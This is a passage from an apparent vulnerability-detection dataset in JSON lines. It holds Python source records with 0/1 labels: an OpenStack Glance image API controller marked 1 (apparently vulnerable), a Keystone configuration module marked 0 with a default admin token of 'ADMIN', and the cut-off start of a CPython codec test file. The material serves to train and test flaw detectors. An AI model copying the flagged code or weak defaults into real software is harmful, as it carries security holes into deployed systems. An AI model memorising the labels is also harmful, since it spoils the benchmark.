image_data):\n        if image_data:\n            image_meta = self._validate_image_for_activation(req,\n                                                             image_id,\n                                                             image_meta)\n            image_meta = self._upload_and_activate(req, image_meta)\n        elif self._copy_from(req):\n            msg = _('Triggering asynchronous copy from external source')\n            LOG.info(msg)\n            self.pool.spawn_n(self._upload_and_activate, req, image_meta)\n        else:\n            location = image_meta.get('location')\n            if location:\n                self._validate_image_for_activation(req, image_id, image_meta)\n                image_meta = self._activate(req, image_id, location)\n        return image_meta\n\n    def _validate_image_for_activation(self, req, id, values):\n        \"\"\"Ensures that all required image metadata values are valid.\"\"\"\n        image = self.get_image_meta_or_404(req, id)\n        if not 'disk_format' in values:\n            values['disk_format'] = image['disk_format']\n        if not 'container_format' in values:\n            values['container_format'] = image['container_format']\n        if not 'name' in values:\n            values['name'] = image['name']\n\n        values = validate_image_meta(req, values)\n        return values\n\n    @utils.mutating\n    def create(self, req, image_meta, image_data):\n        \"\"\"\n        Adds a new image to Glance. Four scenarios exist when creating an\n        image:\n\n        1. If the image data is available directly for upload, create can be\n           passed the image data as the request body and the metadata as the\n           request headers. The image will initially be 'queued', during\n           upload it will be in the 'saving' status, and then 'killed' or\n           'active' depending on whether the upload completed successfully.\n\n        2. If the image data exists somewhere else, you can upload indirectly\n           from the external source using the x-glance-api-copy-from header.\n           Once the image is uploaded, the external store is not subsequently\n           consulted, i.e. the image content is served out from the configured\n           glance image store.  State transitions are as for option #1.\n\n        3. If the image data exists somewhere else, you can reference the\n           source using the x-image-meta-location header. The image content\n           will be served out from the external store, i.e. is never uploaded\n           to the configured glance image store.\n\n        4. If the image data is not available yet, but you'd like reserve a\n           spot for it, you can omit the data and a record will be created in\n           the 'queued' state. This exists primarily to maintain backwards\n           compatibility with OpenStack/Rackspace API semantics.\n\n        The request body *must* be encoded as application/octet-stream,\n        otherwise an HTTPBadRequest is returned.\n\n        Upon a successful save of the image data and metadata, a response\n        containing metadata about the image is returned, including its\n        opaque identifier.\n\n        :param req: The WSGI/Webob Request object\n        :param image_meta: Mapping of metadata about image\n        :param image_data: Actual image data that is to be stored\n\n        :raises HTTPBadRequest if x-image-meta-location is missing\n                and the request body is not application/octet-stream\n                image data.\n        \"\"\"\n        self._enforce(req, 'add_image')\n        is_public = image_meta.get('is_public')\n        if is_public:\n            self._enforce(req, 'publicize_image')\n\n        image_meta = self._reserve(req, image_meta)\n        id = image_meta['id']\n\n        image_meta = self._handle_source(req, id, image_meta, image_data)\n\n        location_uri = image_meta.get('location')\n        if location_uri:\n            self.update_store_acls(req, id, location_uri, public=is_public)\n\n        # Prevent client from learning the location, as it\n        # could contain security credentials\n        image_meta.pop('location', None)\n\n        return {'image_meta': image_meta}\n\n    @utils.mutating\n    def update(self, req, id, image_meta, image_data):\n        \"\"\"\n        Updates an existing image with the registry.\n\n        :param request: The WSGI/Webob Request object\n        :param id: The opaque image identifier\n\n        :retval Returns the updated image information as a mapping\n        \"\"\"\n        self._enforce(req, 'modify_image')\n        is_public = image_meta.get('is_public')\n        if is_public:\n            self._enforce(req, 'publicize_image')\n\n        orig_image_meta = self.get_image_meta_or_404(req, id)\n        orig_status = orig_image_meta['status']\n\n        # Do not allow any updates on a deleted image.\n        # Fix for LP Bug #1060930\n        if orig_status == 'deleted':\n            msg = _(\"Forbidden to update deleted image.\")\n            raise HTTPForbidden(explanation=msg,\n                                request=req,\n                                content_type=\"text/plain\")\n\n        # The default behaviour for a PUT /images/<IMAGE_ID> is to\n        # override any properties that were previously set. This, however,\n        # leads to a number of issues for the common use case where a caller\n        # registers an image with some properties and then almost immediately\n        # uploads an image file along with some more properties. Here, we\n        # check for a special header value to be false in order to force\n        # properties NOT to be purged. However we also disable purging of\n        # properties if an image file is being uploaded...\n        purge_props = req.headers.get('x-glance-registry-purge-props', True)\n        purge_props = (utils.bool_from_string(purge_props) and\n                       image_data is None)\n\n        if image_data is not None and orig_status != 'queued':\n            raise HTTPConflict(_(\"Cannot upload to an unqueued image\"))\n\n        # Only allow the Location|Copy-From fields to be modified if the\n        # image is in queued status, which indicates that the user called\n        # POST /images but originally supply neither a Location|Copy-From\n        # field NOR image data\n        location = self._external_source(image_meta, req)\n        reactivating = orig_status != 'queued' and location\n        activating = orig_status == 'queued' and (location or image_data)\n\n        # Make image public in the backend store (if implemented)\n        orig_or_updated_loc = location or orig_image_meta.get('location', None)\n        if orig_or_updated_loc:\n            self.update_store_acls(req, id, orig_or_updated_loc,\n                                   public=is_public)\n\n        if reactivating:\n            msg = _(\"Attempted to update Location field for an image \"\n                    \"not in queued status.\")\n            raise HTTPBadRequest(explanation=msg,\n                                 request=req,\n                                 content_type=\"text/plain\")\n\n        try:\n            if location:\n                image_meta['size'] = self._get_size(req.context, image_meta,\n                                                    location)\n\n            image_meta = registry.update_image_metadata(req.context,\n                                                        id,\n                                                        image_meta,\n                                                        purge_props)\n\n            if activating:\n                image_meta = self._handle_source(req, id, image_meta,\n                                                 image_data)\n\n        except exception.Invalid, e:\n            msg = (_(\"Failed to update image metadata. Got error: %(e)s\")\n                   % locals())\n            for line in msg.split('\\n'):\n                LOG.error(line)\n            raise HTTPBadRequest(explanation=msg,\n                                 request=req,\n                                 content_type=\"text/plain\")\n        except exception.NotFound, e:\n            msg = (\"Failed to find image to update: %(e)s\" % locals())\n            for line in msg.split('\\n'):\n                LOG.info(line)\n            raise HTTPNotFound(explanation=msg,\n                               request=req,\n                               content_type=\"text/plain\")\n        except exception.Forbidden, e:\n            msg = (\"Forbidden to update image: %(e)s\" % locals())\n            for line in msg.split('\\n'):\n                LOG.info(line)\n            raise HTTPForbidden(explanation=msg,\n                                request=req,\n                                content_type=\"text/plain\")\n        else:\n            self.notifier.info('image.update', image_meta)\n\n        # Prevent client from learning the location, as it\n        # could contain security credentials\n        image_meta.pop('location', None)\n\n        return {'image_meta': image_meta}\n\n    @utils.mutating\n    def delete(self, req, id):\n        \"\"\"\n        Deletes the image and all its chunks from the Glance\n\n        :param req: The WSGI/Webob Request object\n        :param id: The opaque image identifier\n\n        :raises HttpBadRequest if image registry is invalid\n        :raises HttpNotFound if image or any chunk is not available\n        :raises HttpUnauthorized if image or any chunk is not\n                deleteable by the requesting user\n        \"\"\"\n        self._enforce(req, 'delete_image')\n\n        image = self.get_image_meta_or_404(req, id)\n        if image['protected']:\n            msg = _(\"Image is protected\")\n            LOG.debug(msg)\n            raise HTTPForbidden(explanation=msg,\n                                request=req,\n                                content_type=\"text/plain\")\n\n        if image['status'] == 'deleted':\n            msg = _(\"Forbidden to delete a deleted image.\")\n            LOG.debug(msg)\n            raise HTTPForbidden(explanation=msg, request=req,\n                                content_type=\"text/plain\")\n\n        status = 'deleted'\n        try:\n            # The image's location field may be None in the case\n            # of a saving or queued image, therefore don't ask a backend\n            # to delete the image if the backend doesn't yet store it.\n            # See https://bugs.launchpad.net/glance/+bug/747799\n            if image['location']:\n                if CONF.delayed_delete:\n                    status = 'pending_delete'\n                    schedule_delayed_delete_from_backend(image['location'], id)\n                else:\n                    safe_delete_from_backend(image['location'],\n                                             req.context, id)\n\n            registry.update_image_metadata(req.context, id, {'status': status})\n            registry.delete_image_metadata(req.context, id)\n        except exception.NotFound, e:\n            msg = (\"Failed to find image to delete: %(e)s\" % locals())\n            for line in msg.split('\\n'):\n                LOG.info(line)\n            raise HTTPNotFound(explanation=msg,\n                               request=req,\n                               content_type=\"text/plain\")\n        except exception.Forbidden, e:\n            msg = (\"Forbidden to delete image: %(e)s\" % locals())\n            for line in msg.split('\\n'):\n                LOG.info(line)\n            raise HTTPForbidden(explanation=msg,\n                                request=req,\n                                content_type=\"text/plain\")\n        else:\n            self.notifier.info('image.delete', image)\n\n    def get_store_or_400(self, request, scheme):\n        \"\"\"\n        Grabs the storage backend for the supplied store name\n        or raises an HTTPBadRequest (400) response\n\n        :param request: The WSGI/Webob Request object\n        :param scheme: The backend store scheme\n\n        :raises HTTPNotFound if store does not exist\n        \"\"\"\n        try:\n            return get_store_from_scheme(request.context, scheme)\n        except exception.UnknownScheme:\n            msg = _(\"Store for scheme %s not found\")\n            LOG.error(msg % scheme)\n            raise HTTPBadRequest(explanation=msg,\n                                 request=request,\n                                 content_type='text/plain')\n\n    def verify_scheme_or_exit(self, scheme):\n        \"\"\"\n        Verifies availability of the storage backend for the\n        given scheme or exits\n\n        :param scheme: The backend store scheme\n        \"\"\"\n        try:\n            get_store_from_scheme(context.RequestContext(), scheme)\n        except exception.UnknownScheme:\n            msg = _(\"Store for scheme %s not found\")\n            LOG.error(msg % scheme)\n            # message on stderr will only be visible if started directly via\n            # bin/glance-api, as opposed to being daemonized by glance-control\n            sys.stderr.write(msg % scheme)\n            sys.exit(255)\n\n\nclass ImageDeserializer(wsgi.JSONRequestDeserializer):\n    \"\"\"Handles deserialization of specific controller method requests.\"\"\"\n\n    def _deserialize(self, request):\n        result = {}\n        try:\n            result['image_meta'] = utils.get_image_meta_from_headers(request)\n        except exception.Invalid:\n            image_size_str = request.headers['x-image-meta-size']\n            msg = _(\"Incoming image size of %s was not convertible to \"\n                    \"an integer.\") % image_size_str\n            raise HTTPBadRequest(explanation=msg, request=request)\n\n        image_meta = result['image_meta']\n        image_meta = validate_image_meta(request, image_meta)\n        if request.content_length:\n            image_size = request.content_length\n        elif 'size' in image_meta:\n            image_size = image_meta['size']\n        else:\n            image_size = None\n\n        data = request.body_file if self.has_body(request) else None\n\n        if image_size is None and data is not None:\n            data = utils.LimitingReader(data, CONF.image_size_cap)\n\n            #NOTE(bcwaldon): this is a hack to make sure the downstream code\n            # gets the correct image data\n            request.body_file = data\n\n        elif image_size > CONF.image_size_cap:\n            max_image_size = CONF.image_size_cap\n            msg = _(\"Denying attempt to upload image larger than %d bytes.\")\n            LOG.warn(msg % max_image_size)\n            raise HTTPBadRequest(explanation=msg % max_image_size,\n                                 request=request)\n\n        result['image_data'] = data\n        return result\n\n    def create(self, request):\n        return self._deserialize(request)\n\n    def update(self, request):\n        return self._deserialize(request)\n\n\nclass ImageSerializer(wsgi.JSONResponseSerializer):\n    \"\"\"Handles serialization of specific controller method responses.\"\"\"\n\n    def __init__(self):\n        self.notifier = notifier.Notifier()\n\n    def _inject_location_header(self, response, image_meta):\n        location = self._get_image_location(image_meta)\n        response.headers['Location'] = location.encode('utf-8')\n\n    def _inject_checksum_header(self, response, image_meta):\n        if image_meta['checksum'] is not None:\n            response.headers['ETag'] = image_meta['checksum'].encode('utf-8')\n\n    def _inject_image_meta_headers(self, response, image_meta):\n        \"\"\"\n        Given a response and mapping of image metadata, injects\n        the Response with a set of HTTP headers for the image\n        metadata. Each main image metadata field is injected\n        as a HTTP header with key 'x-image-meta-<FIELD>' except\n        for the properties field, which is further broken out\n        into a set of 'x-image-meta-property-<KEY>' headers\n\n        :param response: The Webob Response object\n        :param image_meta: Mapping of image metadata\n        \"\"\"\n        headers = utils.image_meta_to_http_headers(image_meta)\n\n        for k, v in headers.items():\n            response.headers[k.encode('utf-8')] = v.encode('utf-8')\n\n    def _get_image_location(self, image_meta):\n        \"\"\"Build a relative url to reach the image defined by image_meta.\"\"\"\n        return \"/v1/images/%s\" % image_meta['id']\n\n    def meta(self, response, result):\n        image_meta = result['image_meta']\n        self._inject_image_meta_headers(response, image_meta)\n        self._inject_location_header(response, image_meta)\n        self._inject_checksum_header(response, image_meta)\n        return response\n\n    def show(self, response, result):\n        image_meta = result['image_meta']\n        image_id = image_meta['id']\n\n        image_iter = result['image_iterator']\n        # image_meta['size'] should be an int, but could possibly be a str\n        expected_size = int(image_meta['size'])\n        response.app_iter = common.size_checked_iter(\n                response, image_meta, expected_size, image_iter, self.notifier)\n        # Using app_iter blanks content-length, so we set it here...\n        response.headers['Content-Length'] = str(image_meta['size'])\n        response.headers['Content-Type'] = 'application/octet-stream'\n\n        self._inject_image_meta_headers(response, image_meta)\n        self._inject_location_header(response, image_meta)\n        self._inject_checksum_header(response, image_meta)\n\n        return response\n\n    def update(self, response, result):\n        image_meta = result['image_meta']\n        response.body = self.to_json(dict(image=image_meta))\n        response.headers['Content-Type'] = 'application/json'\n        self._inject_location_header(response, image_meta)\n        self._inject_checksum_header(response, image_meta)\n        return response\n\n    def create(self, response, result):\n        image_meta = result['image_meta']\n        response.status = 201\n        response.headers['Content-Type'] = 'application/json'\n        response.body = self.to_json(dict(image=image_meta))\n        self._inject_location_header(response, image_meta)\n        self._inject_checksum_header(response, image_meta)\n        return response\n\n\ndef create_resource():\n    \"\"\"Images resource factory method\"\"\"\n    deserializer = ImageDeserializer()\n    serializer = ImageSerializer()\n    return wsgi.Resource(Controller(), deserializer, serializer)\n", "target": 1}
{"idx": 1030, "func": "# vim: tabstop=4 shiftwidth=4 softtabstop=4\n\n# Copyright 2012 OpenStack LLC\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n# not use this file except in compliance with the License. You may obtain\n# a copy of the License at\n#\n#      http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n# WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n# License for the specific language governing permissions and limitations\n# under the License.\n\nimport gettext\nimport os\nimport sys\n\nfrom oslo.config import cfg\n\nfrom keystone.common import logging\n\n\ngettext.install('keystone', unicode=1)\n\n_DEFAULT_LOG_FORMAT = \"%(asctime)s %(levelname)8s [%(name)s] %(message)s\"\n_DEFAULT_LOG_DATE_FORMAT = \"%Y-%m-%d %H:%M:%S\"\n_DEFAULT_AUTH_METHODS = ['password', 'token']\n\nCOMMON_CLI_OPTS = [\n    cfg.BoolOpt('debug',\n                short='d',\n                default=False,\n                help='Print debugging output (set logging level to '\n                     'DEBUG instead of default WARNING level).'),\n    cfg.BoolOpt('verbose',\n                short='v',\n                default=False,\n                help='Print more verbose output (set logging level to '\n                     'INFO instead of default WARNING level).'),\n]\n\nLOGGING_CLI_OPTS = [\n    cfg.StrOpt('log-config',\n               metavar='PATH',\n               help='If this option is specified, the logging configuration '\n                    'file specified is used and overrides any other logging '\n                    'options specified. Please see the Python logging module '\n                    'documentation for details on logging configuration '\n                    'files.'),\n    cfg.StrOpt('log-format',\n               default=_DEFAULT_LOG_FORMAT,\n               metavar='FORMAT',\n               help='A logging.Formatter log message format string which may '\n                    'use any of the available logging.LogRecord attributes.'),\n    cfg.StrOpt('log-date-format',\n               default=_DEFAULT_LOG_DATE_FORMAT,\n               metavar='DATE_FORMAT',\n               help='Format string for %%(asctime)s in log records.'),\n    cfg.StrOpt('log-file',\n               metavar='PATH',\n               help='Name of log file to output. '\n                    'If not set, logging will go to stdout.'),\n    cfg.StrOpt('log-dir',\n               help='The directory in which to store log files. '\n                    '(will be prepended to --log-file)'),\n    cfg.BoolOpt('use-syslog',\n                default=False,\n                help='Use syslog for logging.'),\n    cfg.StrOpt('syslog-log-facility',\n               default='LOG_USER',\n               help='syslog facility to receive log lines.')\n]\n\nCONF = cfg.CONF\n\n\ndef setup_logging(conf):\n    \"\"\"\n    Sets up the logging options for a log with supplied name\n\n    :param conf: a cfg.ConfOpts object\n    \"\"\"\n\n    if conf.log_config:\n        # Use a logging configuration file for all settings...\n        if os.path.exists(conf.log_config):\n            logging.config.fileConfig(conf.log_config)\n            return\n        else:\n            raise RuntimeError(_('Unable to locate specified logging '\n                               'config file: %s') % conf.log_config)\n\n    root_logger = logging.root\n    if conf.debug:\n        root_logger.setLevel(logging.DEBUG)\n    elif conf.verbose:\n        root_logger.setLevel(logging.INFO)\n    else:\n        root_logger.setLevel(logging.WARNING)\n\n    formatter = logging.Formatter(conf.log_format, conf.log_date_format)\n\n    if conf.use_syslog:\n        try:\n            facility = getattr(logging.SysLogHandler,\n                               conf.syslog_log_facility)\n        except AttributeError:\n            raise ValueError(_('Invalid syslog facility'))\n\n        handler = logging.SysLogHandler(address='/dev/log',\n                                        facility=facility)\n    elif conf.log_file:\n        logfile = conf.log_file\n        if conf.log_dir:\n            logfile = os.path.join(conf.log_dir, logfile)\n        handler = logging.WatchedFileHandler(logfile)\n    else:\n        handler = logging.StreamHandler(sys.stdout)\n\n    handler.setFormatter(formatter)\n    root_logger.addHandler(handler)\n\n\ndef setup_authentication():\n    # register any non-default auth methods here (used by extensions, etc)\n    for method_name in CONF.auth.methods:\n        if method_name not in _DEFAULT_AUTH_METHODS:\n            register_str(method_name, group=\"auth\")\n\n\ndef register_str(*args, **kw):\n    conf = kw.pop('conf', CONF)\n    group = kw.pop('group', None)\n    return conf.register_opt(cfg.StrOpt(*args, **kw), group=group)\n\n\ndef register_cli_str(*args, **kw):\n    conf = kw.pop('conf', CONF)\n    group = kw.pop('group', None)\n    return conf.register_cli_opt(cfg.StrOpt(*args, **kw), group=group)\n\n\ndef register_list(*args, **kw):\n    conf = kw.pop('conf', CONF)\n    group = kw.pop('group', None)\n    return conf.register_opt(cfg.ListOpt(*args, **kw), group=group)\n\n\ndef register_cli_list(*args, **kw):\n    conf = kw.pop('conf', CONF)\n    group = kw.pop('group', None)\n    return conf.register_cli_opt(cfg.ListOpt(*args, **kw), group=group)\n\n\ndef register_bool(*args, **kw):\n    conf = kw.pop('conf', CONF)\n    group = kw.pop('group', None)\n    return conf.register_opt(cfg.BoolOpt(*args, **kw), group=group)\n\n\ndef register_cli_bool(*args, **kw):\n    conf = kw.pop('conf', CONF)\n    group = kw.pop('group', None)\n    return conf.register_cli_opt(cfg.BoolOpt(*args, **kw), group=group)\n\n\ndef register_int(*args, **kw):\n    conf = kw.pop('conf', CONF)\n    group = kw.pop('group', None)\n    return conf.register_opt(cfg.IntOpt(*args, **kw), group=group)\n\n\ndef register_cli_int(*args, **kw):\n    conf = kw.pop('conf', CONF)\n    group = kw.pop('group', None)\n    return conf.register_cli_opt(cfg.IntOpt(*args, **kw), group=group)\n\n\ndef configure():\n    CONF.register_cli_opts(COMMON_CLI_OPTS)\n    CONF.register_cli_opts(LOGGING_CLI_OPTS)\n\n    register_cli_bool('standard-threads', default=False)\n\n    register_cli_str('pydev-debug-host', default=None)\n    register_cli_int('pydev-debug-port', default=None)\n\n    register_str('admin_token', secret=True, default='ADMIN')\n    register_str('bind_host', default='0.0.0.0')\n    register_int('compute_port', default=8774)\n    register_int('admin_port', default=35357)\n    register_int('public_port', default=5000)\n    register_str(\n        'public_endpoint', default='http://localhost:%(public_port)d/')\n    register_str('admin_endpoint', default='http://localhost:%(admin_port)d/')\n    register_str('onready')\n    register_str('auth_admin_prefix', default='')\n    register_str('policy_file', default='policy.json')\n    register_str('policy_default_rule', default=None)\n    # default max request size is 112k\n    register_int('max_request_body_size', default=114688)\n    register_int('max_param_size', default=64)\n    # we allow tokens to be a bit larger to accommodate PKI\n    register_int('max_token_size', default=8192)\n    register_str(\n        'member_role_id', default='9fe2ff9ee4384b1894a90878d3e92bab')\n    register_str('member_role_name', default='_member_')\n\n    # identity\n    register_str('default_domain_id', group='identity', default='default')\n\n    # trust\n    register_bool('enabled', group='trust', default=True)\n\n    # ssl\n    register_bool('enable', group='ssl', default=False)\n    register_str('certfile', group='ssl', default=None)\n    register_str('keyfile', group='ssl', default=None)\n    register_str('ca_certs', group='ssl', default=None)\n    register_bool('cert_required', group='ssl', default=False)\n\n    # signing\n    register_str(\n        'token_format', group='signing', default=\"PKI\")\n    register_str(\n        'certfile',\n        group='signing',\n        default=\"/etc/keystone/ssl/certs/signing_cert.pem\")\n    register_str(\n        'keyfile',\n        group='signing',\n        default=\"/etc/keystone/ssl/private/signing_key.pem\")\n    register_str(\n        'ca_certs',\n        group='signing',\n        default=\"/etc/keystone/ssl/certs/ca.pem\")\n    register_int('key_size', group='signing', default=1024)\n    register_int('valid_days', group='signing', default=3650)\n    register_str('ca_password', group='signing', default=None)\n\n    # sql\n    register_str('connection', group='sql', default='sqlite:///keystone.db')\n    register_int('idle_timeout', group='sql', default=200)\n\n    register_str(\n        'driver',\n        group='catalog',\n        default='keystone.catalog.backends.sql.Catalog')\n    register_str(\n        'driver',\n        group='identity',\n        default='keystone.identity.backends.sql.Identity')\n    register_str(\n        'driver',\n        group='policy',\n        default='keystone.policy.backends.sql.Policy')\n    register_str(\n        'driver', group='token', default='keystone.token.backends.kvs.Token')\n    register_str(\n        'driver', group='trust', default='keystone.trust.backends.sql.Trust')\n    register_str(\n        'driver', group='ec2', default='keystone.contrib.ec2.backends.kvs.Ec2')\n    register_str(\n        'driver',\n        group='stats',\n        default='keystone.contrib.stats.backends.kvs.Stats')\n\n    # ldap\n    register_str('url', group='ldap', default='ldap://localhost')\n    register_str('user', group='ldap', default=None)\n    register_str('password', group='ldap', secret=True, default=None)\n    register_str('suffix', group='ldap', default='cn=example,cn=com')\n    register_bool('use_dumb_member', group='ldap', default=False)\n    register_str('dumb_member', group='ldap', default='cn=dumb,dc=nonexistent')\n    register_bool('allow_subtree_delete', group='ldap', default=False)\n    register_str('query_scope', group='ldap', default='one')\n    register_int('page_size', group='ldap', default=0)\n    register_str('alias_dereferencing', group='ldap', default='default')\n\n    register_str('user_tree_dn', group='ldap', default=None)\n    register_str('user_filter', group='ldap', default=None)\n    register_str('user_objectclass', group='ldap', default='inetOrgPerson')\n    register_str('user_id_attribute', group='ldap', default='cn')\n    register_str('user_name_attribute', group='ldap', default='sn')\n    register_str('user_mail_attribute', group='ldap', default='email')\n    register_str('user_pass_attribute', group='ldap', default='userPassword')\n    register_str('user_enabled_attribute', group='ldap', default='enabled')\n    register_str(\n        'user_domain_id_attribute', group='ldap', default='businessCategory')\n    register_int('user_enabled_mask', group='ldap', default=0)\n    register_str('user_enabled_default', group='ldap', default='True')\n    register_list(\n        'user_attribute_ignore', group='ldap', default='tenant_id,tenants')\n    register_bool('user_allow_create', group='ldap', default=True)\n    register_bool('user_allow_update', group='ldap', default=True)\n    register_bool('user_allow_delete', group='ldap', default=True)\n    register_bool('user_enabled_emulation', group='ldap', default=False)\n    register_str('user_enabled_emulation_dn', group='ldap', default=None)\n\n    register_str('tenant_tree_dn', group='ldap', default=None)\n    register_str('tenant_filter', group='ldap', default=None)\n    register_str('tenant_objectclass', group='ldap', default='groupOfNames')\n    register_str('tenant_id_attribute', group='ldap', default='cn')\n    register_str('tenant_member_attribute', group='ldap', default='member')\n    register_str('tenant_name_attribute', group='ldap', default='ou')\n    register_str('tenant_desc_attribute', group='ldap', default='description')\n    register_str('tenant_enabled_attribute', group='ldap', default='enabled')\n    register_str(\n        'tenant_domain_id_attribute', group='ldap', default='businessCategory')\n    register_list('tenant_attribute_ignore', group='ldap', default='')\n    register_bool('tenant_allow_create', group='ldap', default=True)\n    register_bool('tenant_allow_update', group='ldap', default=True)\n    register_bool('tenant_allow_delete', group='ldap', default=True)\n    register_bool('tenant_enabled_emulation', group='ldap', default=False)\n    register_str('tenant_enabled_emulation_dn', group='ldap', default=None)\n\n    register_str('role_tree_dn', group='ldap', default=None)\n    register_str('role_filter', group='ldap', default=None)\n    register_str(\n        'role_objectclass', group='ldap', default='organizationalRole')\n    register_str('role_id_attribute', group='ldap', default='cn')\n    register_str('role_name_attribute', group='ldap', default='ou')\n    register_str('role_member_attribute', group='ldap', default='roleOccupant')\n    register_list('role_attribute_ignore', group='ldap', default='')\n    register_bool('role_allow_create', group='ldap', default=True)\n    register_bool('role_allow_update', group='ldap', default=True)\n    register_bool('role_allow_delete', group='ldap', default=True)\n\n    register_str('group_tree_dn', group='ldap', default=None)\n    register_str('group_filter', group='ldap', default=None)\n    register_str('group_objectclass', group='ldap', default='groupOfNames')\n    register_str('group_id_attribute', group='ldap', default='cn')\n    register_str('group_name_attribute', group='ldap', default='ou')\n    register_str('group_member_attribute', group='ldap', default='member')\n    register_str('group_desc_attribute', group='ldap', default='description')\n    register_str(\n        'group_domain_id_attribute', group='ldap', default='businessCategory')\n    register_list('group_attribute_ignore', group='ldap', default='')\n    register_bool('group_allow_create', group='ldap', default=True)\n    register_bool('group_allow_update', group='ldap', default=True)\n    register_bool('group_allow_delete', group='ldap', default=True)\n\n    register_str('domain_tree_dn', group='ldap', default=None)\n    register_str('domain_filter', group='ldap', default=None)\n    register_str('domain_objectclass', group='ldap', default='groupOfNames')\n    register_str('domain_id_attribute', group='ldap', default='cn')\n    register_str('domain_name_attribute', group='ldap', default='ou')\n    register_str('domain_member_attribute', group='ldap', default='member')\n    register_str('domain_desc_attribute', group='ldap', default='description')\n    register_str('domain_enabled_attribute', group='ldap', default='enabled')\n    register_list('domain_attribute_ignore', group='ldap', default='')\n    register_bool('domain_allow_create', group='ldap', default=True)\n    register_bool('domain_allow_update', group='ldap', default=True)\n    register_bool('domain_allow_delete', group='ldap', default=True)\n    register_bool('domain_enabled_emulation', group='ldap', default=False)\n    register_str('domain_enabled_emulation_dn', group='ldap', default=None)\n\n    # pam\n    register_str('url', group='pam', default=None)\n    register_str('userid', group='pam', default=None)\n    register_str('password', group='pam', default=None)\n\n    # default authentication methods\n    register_list('methods', group='auth', default=_DEFAULT_AUTH_METHODS)\n    register_str(\n        'password', group='auth', default='keystone.auth.plugins.token.Token')\n    register_str(\n        'token', group='auth',\n        default='keystone.auth.plugins.password.Password')\n\n    # register any non-default auth methods here (used by extensions, etc)\n    for method_name in CONF.auth.methods:\n        if method_name not in _DEFAULT_AUTH_METHODS:\n            register_str(method_name, group='auth')\n", "target": 0}
{"idx": 1031, "func": "#\n# multibytecodec_support.py\n#   Common Unittest Routines for CJK codecs\n#\n\nimport codecs\nimport os\nimport re\nimport sys\nimport unittest\nfrom http.client import HTTPException\nfrom test import support\nfrom io import BytesIO\n\nclass TestBase:\n    encoding        = ''   # codec name\n    codec           = None # codec tuple (with 4 elements)\n    tstring         = None # must set. 2 strings to test StreamReader\n\n    codectests      = None # must set. codec test tuple\n    roundtriptest   = 1    # set if roundtrip is possible with unicode\n    has_iso10646    = 0    # set if this encoding contains whole iso10646 map\n    xmlcharnametest = None # string to test xmlcharrefreplace\n    unmappedunicode = '\\udeee' # a unicode code point that is not mapped.\n\n    def setUp(self):\n        if self.codec is None:\n            self.codec = codecs.lookup(self.encoding)\n        self.encode = self.codec.encode\n        self.decode = self.codec.decode\n        self.reader = self.codec.streamreader\n        self.writer = self.codec.streamwriter\n        self.incrementalencoder = self.codec.incrementalencoder\n        self.incrementaldecoder = self.codec.incrementaldecoder\n\n    def test_chunkcoding(self):\n        tstring_lines = []\n        for b in self.tstring:\n            lines = b.split(b\"\\n\")\n            last = lines.pop()\n            assert last == b\"\"\n            lines = [line + b\"\\n\" for line in lines]\n            tstring_lines.append(lines)\n        for native, utf8 in zip(*tstring_lines):\n            u = self.decode(native)[0]\n            self.assertEqual(u, utf8.decode('utf-8'))\n            if self.roundtriptest:\n                self.assertEqual(native, self.encode(u)[0])\n\n    def test_errorhandle(self):\n        for source, scheme, expected in self.codectests:\n            if isinstance(source, bytes):\n                func = self.decode\n            else:\n                func = self.encode\n            if expected:\n                result = func(source, scheme)[0]\n                if func is self.decode:\n                    self.assertTrue(type(result) is str, type(result))\n                    self.assertEqual(result, expected,\n                                     '%a.decode(%r, %r)=%a != %a'\n                                     % (source, self.encoding, scheme, result,\n                                        expected))\n                else:\n                    self.assertTrue(type(result) is bytes, type(result))\n                    self.assertEqual(result, expected,\n                                     '%a.encode(%r, %r)=%a != %a'\n                                     % (source, self.encoding, scheme, result,\n                                        expected))\n            else:\n                self.assertRaises(UnicodeError, func, source, scheme)\n\n    def test_xmlcharrefreplace(self):\n        if self.has_iso10646:\n            self.skipTest('encoding contains full ISO 10646 map')\n\n        s = \"\\u0b13\\u0b23\\u0b60 nd eggs\"\n        self.assertEqual(\n            self.encode(s, \"xmlcharrefreplace\")[0],\n            b\"&#2835;&#2851;&#2912; nd eggs\"\n        )\n\n    def test_customreplace_encode(self):\n        if self.has_iso10646:\n            self.skipTest('encoding contains full ISO 10646 map')\n\n        from html.entities import codepoint2name\n\n        def xmlcharnamereplace(exc):\n            if not isinstance(exc, UnicodeEncodeError):\n                raise TypeError(\"don't know how to handle %r\" % exc)\n            l = []\n            for c in exc.object[exc.start:exc.end]:\n                if ord(c) in codepoint2name:\n                    l.append(\"&%s;\" % codepoint2name[ord(c)])\n                else:\n                    l.append(\"&#%d;\" % ord(c))\n            return (\"\".join(l), exc.end)\n\n        codecs.register_error(\"test.xmlcharnamereplace\", xmlcharnamereplace)\n\n        if self.xmlcharnametest:\n            sin, sout = self.xmlcharnametest\n        else:\n            sin = \"\\xab\\u211c\\xbb = \\u2329\\u1234\\u232a\"\n            sout = b\"&laquo;&real;&raquo; = &lang;&#4660;&rang;\"\n        self.assertEqual(self.encode(sin,\n                                    \"test.xmlcharnamereplace\")[0], sout)\n\n    def test_callback_returns_bytes(self):\n        def myreplace(exc):\n            return (b\"1234\", exc.end)\n        codecs.register_error(\"test.cjktest\", myreplace)\n        enc = self.encode(\"abc\" + self.unmappedunicode + \"def\", \"test.cjktest\")[0]\n        self.assertEqual(enc, b\"abc1234def\")\n\n    def test_callback_wrong_objects(self):\n        def myreplace(exc):\n            return (ret, exc.end)\n        codecs.register_error(\"test.cjktest\", myreplace)\n\n        for ret in ([1, 2, 3], [], None, object()):\n            self.assertRaises(TypeError, self.encode, self.unmappedunicode,\n                              'test.cjktest')\n\n    def test_callback_long_index(self):\n        def myreplace(exc):\n            return ('x', int(exc.end))\n        codecs.register_error(\"test.cjktest\", myreplace)\n        self.assertEqual(self.encode('abcd' + self.unmappedunicode + 'efgh',\n                                     'test.cjktest'), (b'abcdxefgh', 9))\n\n        def myreplace(exc):\n            return ('x', sys.maxsize + 1)\n        codecs.register_error(\"test.cjktest\", myreplace)\n        self.assertRaises(IndexError, self.encode, self.unmappedunicode,\n                          'test.cjktest')\n\n    def test_callback_None_index(self):\n        def myreplace(exc):\n            return ('x', None)\n        codecs.register_error(\"test.cjktest\", myreplace)\n        